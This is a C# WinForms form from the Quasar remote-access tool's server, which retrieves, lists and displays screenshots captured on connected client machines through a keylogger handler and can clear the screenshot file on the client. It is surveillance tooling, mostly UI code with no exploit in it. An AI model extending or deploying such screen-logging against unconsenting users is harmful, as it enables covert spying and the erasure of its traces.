using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmScreenlogger : Form
    {
        private static readonly Dictionary<Client, FrmScreenlogger> OpenedForms = new Dictionary<Client, FrmScreenlogger>();

        private readonly Client _connectClient;
        private readonly KeyloggerHandler _keyloggerHandler;
        private readonly string _baseDownloadPath;

        private ListView lstScreens;
        private ColumnHeader hScreens;
        private PictureBox picViewer;
        private StatusStrip statusStrip;
        private ToolStripStatusLabel stripLblStatus;
        private Button btnGetScreenshots;
        private Button btnClearScreenshots;
        private SplitContainer _split;

        public static FrmScreenlogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var existing))
                return existing;

            var f = new FrmScreenlogger(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmScreenlogger(Client client)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _keyloggerHandler = new KeyloggerHandler(client);
            _baseDownloadPath = Path.Combine(_connectClient.Value.DownloadDirectory, "Logs\\");

            RegisterMessageHandler();
            InitializeUi();
        }

        private void InitializeUi()
        {
            Text = WindowHelper.GetWindowTitle("Screenlogging", _connectClient);
            StartPosition = FormStartPosition.CenterScreen;
            MinimumSize = new Size(630, 465);
            ClientSize = new Size(862, 482);

            _split = new SplitContainer
            {
                Dock = DockStyle.Fill,
                Orientation = Orientation.Vertical,
                // Do not set PanelMinSize here: SplitContainer validates SplitterDistance
                // against min sizes during initialization, but the control width is not
                // known yet (can be 0), causing InvalidOperationException.
            };

            lstScreens = new ListView
            {
                Dock = DockStyle.Fill,
                FullRowSelect = true,
                GridLines = true,
                View = View.Details,
                Font = new Font("Segoe UI", 8.25F)
            };
            lstScreens.ItemActivate += lstScreens_ItemActivate;

            hScreens = new ColumnHeader { Text = "Screenshots", Width = 170 };
            lstScreens.Columns.AddRange(new[] { hScreens });
            _split.Panel1.Controls.Add(lstScreens);

            picViewer = new PictureBox
            {
                Dock = DockStyle.Fill,
                BorderStyle = BorderStyle.FixedSingle,
                SizeMode = PictureBoxSizeMode.Zoom,
                BackColor = Color.Black
            };
            _split.Panel2.Controls.Add(picViewer);

            var buttonsPanel = new FlowLayoutPanel
            {
                Dock = DockStyle.Top,
                Height = 30,
                Padding = new Padding(2)
            };

            btnGetScreenshots = new Button
            {
                Text = "Get Screenshots",
                Width = 160
            };
            btnGetScreenshots.Click += btnGetScreenshots_Click;
            buttonsPanel.Controls.Add(btnGetScreenshots);

            btnClearScreenshots = new Button
            {
                Text = "Clear Screenshot File on Client",
                Width = 240
            };
            btnClearScreenshots.Click += btnClearScreenshots_Click;
            buttonsPanel.Controls.Add(btnClearScreenshots);

            statusStrip = new StatusStrip();
            stripLblStatus = new ToolStripStatusLabel { Text = "Status: Ready" };
            statusStrip.Items.Add(stripLblStatus);
            statusStrip.Dock = DockStyle.Bottom;

            Controls.Add(_split);
            Controls.Add(buttonsPanel);
            Controls.Add(statusStrip);

            FormClosing += FrmScreenlogger_FormClosing;
            Load += FrmScreenlogger_Load;
            Shown += (s, e) => AdjustLeftWidth();
            Resize += (s, e) => AdjustLeftWidth();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)Close);
            }
        }

        private void FrmScreenlogger_Load(object sender, EventArgs e)
        {
            Text = WindowHelper.GetWindowTitle("Screenlogging", _connectClient);

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            RefreshScreensDirectory();
        }

        private void FrmScreenlogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
        }

        private void LogsChanged(object sender, string message)
        {
            RefreshScreensDirectory();
            btnGetScreenshots.Enabled = true;
            btnClearScreenshots.Enabled = true;
            stripLblStatus.Text = "Status: " + message;
        }

        private void btnGetScreenshots_Click(object sender, EventArgs e)
        {
            btnGetScreenshots.Enabled = false;
            btnClearScreenshots.Enabled = false;
            stripLblStatus.Text = "Status: Retrieving screenshots...";
            _keyloggerHandler.RetrieveScreenshots();
        }

        private void btnClearScreenshots_Click(object sender, EventArgs e)
        {
            stripLblStatus.Text = "Status: Clearing screenshot file on client...";
            _keyloggerHandler.ClearScreenshotsOnClient();
        }

        private void lstScreens_ItemActivate(object sender, EventArgs e)
        {
            if (lstScreens.SelectedItems.Count <= 0) return;

            string fileName = lstScreens.SelectedItems[0].Text;
            string fullPath = Path.Combine(_baseDownloadPath, fileName);
            if (!File.Exists(fullPath)) return;

            ShowImage(fullPath);
        }

        private void ShowImage(string filePath)
        {
            try
            {
                picViewer.Image?.Dispose();
                using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var img = Image.FromStream(fs))
                {
                    // Clone so the stream/file isn't locked.
                    picViewer.Image = new Bitmap(img);
                }
            }
            catch
            {
                // Best-effort: if image decode fails, keep current view.
            }
        }

        private void RefreshScreensDirectory()
        {
            lstScreens.Items.Clear();
            if (!Directory.Exists(_baseDownloadPath)) return;

            var dir = new DirectoryInfo(_baseDownloadPath);
            var iFiles = dir.GetFiles()
                .Where(f =>
                    string.Equals(f.Extension, ".jpg", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(f.Extension, ".jpeg", StringComparison.OrdinalIgnoreCase))
                .OrderByDescending(f => f.LastWriteTimeUtc)
                .ToArray();

            foreach (var file in iFiles)
                lstScreens.Items.Add(new ListViewItem { Text = file.Name });

            // Let WinForms complete layout before we resize the splitter/column.
            BeginInvoke(new Action(AdjustLeftWidth));
        }

        private void AdjustLeftWidth()
        {
            if (_split == null || hScreens == null || lstScreens == null) return;
            if (_split.Width <= 0) return;

            const int minLeft = 160;
            const int minRight = 320;
            if (_split.Width < (minLeft + minRight + _split.SplitterWidth))
                return;

            const int padding = 24; // room for column padding + checkbox area

            int maxTextWidth = 0;
            foreach (ListViewItem it in lstScreens.Items)
            {
                if (it == null) continue;
                int w = TextRenderer.MeasureText(it.Text ?? "", lstScreens.Font).Width;
                if (w > maxTextWidth) maxTextWidth = w;
            }

            // If empty, keep a reasonable default.
            if (maxTextWidth == 0)
                maxTextWidth = 220;

            int maxLeft = _split.Width - minRight - _split.SplitterWidth;
            if (maxLeft < minLeft) maxLeft = minLeft;

            int desired = maxTextWidth + padding;
            desired = Math.Max(minLeft, Math.Min(desired, maxLeft));

            if (Math.Abs(_split.SplitterDistance - desired) <= 2) return;

            hScreens.Width = desired;
            _split.SplitterDistance = desired;
        }
    }
}

